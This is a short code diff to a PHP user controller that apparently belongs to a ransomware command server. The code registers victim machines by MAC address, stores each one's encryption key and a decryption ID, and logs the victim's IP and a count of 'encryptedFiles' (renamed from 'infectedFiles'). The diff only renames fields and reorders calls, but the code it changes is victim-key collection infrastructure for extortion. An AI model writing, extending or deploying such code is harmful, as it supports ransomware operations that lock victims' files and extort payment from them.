@@ -28,7 +28,7 @@ class UserController extends BaseController
     {
         try {
             $data = json_decode($request->getContent(), true);
-            $macAdress = $data['macAdress'];
+            $macAdress = $data['macAddress'];
 
             $encryptionKey = $data['encryptionKey'];
 
@@ -43,15 +43,15 @@ class UserController extends BaseController
                     $uuid
                 ))
                 ->setEncryptionKey($encryptionKey)
-                ->setRoles(['ROLE_USER'])
-                ->setDecryptId($uuid);
+                ->setDecryptId($uuid)
+                ->setRoles(['ROLE_USER']);
 
             $this->userRepository->save($user, true);
 
             $log = (new Log)
                 ->setIp($data['ip']);
 
-            if(array_key_exists('infectedFiles', $data)) $log->setNumberInfectedFile($data['infectedFiles']);
+            if(array_key_exists('encryptedFiles', $data)) $log->setNumberInfectedFile($data['encryptedFiles']);
 
             $this->logRepository->save($log, true);
 
